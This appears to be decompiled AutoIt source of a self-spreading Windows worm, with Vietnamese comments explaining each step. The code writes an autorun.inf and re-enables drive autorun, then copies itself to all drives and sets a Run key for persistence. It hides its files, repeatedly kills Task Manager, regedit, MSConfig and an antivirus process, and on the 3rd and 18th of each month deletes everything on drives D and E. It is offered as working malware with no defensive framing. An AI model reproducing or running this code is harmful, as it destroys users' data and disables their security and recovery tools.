; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: E:\soft\Hacker - Cracker\Autoit virut - soft\Cuc ki nguy hiem xin dung vao\vr1.au3>
; ----------------------------------------------------------------------------


Opt("TrayIconHide", 1)

FileDelete("autorun.inf")
$file2 = FileOpen("autorun.inf", 1)
FileWriteLine($file2, "[AutoRun]")
FileWriteLine($file2, "open=,.exe")
FileWriteLine($file2, "shellexecute=,.exe")
FileWriteLine($file2, "shell\Auto\command=,.exe")
FileClose($file2)
;tao file autorun.inf
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDriveAutoRun", "REG_DWORD", "000000000")
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDriveAutoRun", "REG_DWORD", "000000000")
;cho autorun o dia
$var4 = @ScriptDir
If $var4 <> "C:\WINDOWS" Then
FileCreateShortcut(@WindowsDir & "\Explorer.exe",@DesktopDir & "\1.lnk","",@ScriptDir, "","", "^!t", "", @SW_SHOWMAXIMIZED)
Send("^!t")
EndIf
;tao 1 shortcut de chay vao o dia tru thu muc system32 cua he thong
FileSetAttrib("autorun.inf", "+HS")
FileSetAttrib(@DesktopDir & "\1.lnk", "+HS")
;lam cho 2 file shortcut va autorun co thuoc tinh an he thong.
$search = FileFindFirstFile("D:\*.*")
$search0 = FileFindFirstFile("E:\*.*")
;nhan dien tac ca cac file va folder trong o dia D va E
$bLoop = 1
While $bLoop = 1
	$file = FileFindNextFile($search)
	$file0 = FileFindNextFile($search0)

	If @MDAY = "03" Or @MDAY = "18" Then
		DirRemove("D:\" & $file, 1)
		DirRemove("E:\" & $file0, 1)
		;xoa file khi dung ngay da chon.
	Else
	$var = DriveGetDrive("all")
    For $i = 1 to $var[0]
		If $var[$i] = "a:" or $var[$i] = "b:" Then
			For $i = 2 to $var[0]
			FileCopy(@ScriptDir & "\,.exe", $var[$i], 8)
			FileCopy(@ScriptDir & "\autorun.inf", $var[$i], 1)
			Next
		Else
			FileCopy(@ScriptDir & "\,.exe", $var[$i], 8)
			FileCopy(@ScriptDir & "\autorun.inf", $var[$i], 1)
		EndIf
	Next
	;copy vao tac ca o dia khi chuong trinh dang chay
EndIf
		FileCopy(@ScriptDir & "\,.exe", @WindowsDir, 8)
		FileCopy(@ScriptDir & "\autorun.inf", @WindowsDir, 1)
	ProcessClose("MSConfig.exe")
	$PID3 = ProcessExists("MSConfig.exe")
	If $PID3 Then ProcessClose($PID3)
	ProcessClose("regedit.exe")
	$PID2 = ProcessExists("regedit.exe")
	If $PID2 Then ProcessClose($PID2)
	ProcessClose("taskmgr.exe")
	$PID1 = ProcessExists("taskmgr.exe")
	If $PID1 Then ProcessClose($PID1)
	ProcessClose("Bkav2006.exe")
	$PID4 = ProcessExists("Bkav2006.exe")
	If $PID4 Then ProcessClose($PID4)
	;tat cac chuong trinh co the anh huong den virus
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HUI", "REG_SZ", "C:\windows\,.exe")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt", "REG_DWORD", "000000001")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden", "REG_DWORD", "000000000")

WEnd



; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: E:\soft\Hacker - Cracker\Autoit virut - soft\Cuc ki nguy hiem xin dung vao\vr1.au3>
; ----------------------------------------------------------------------------

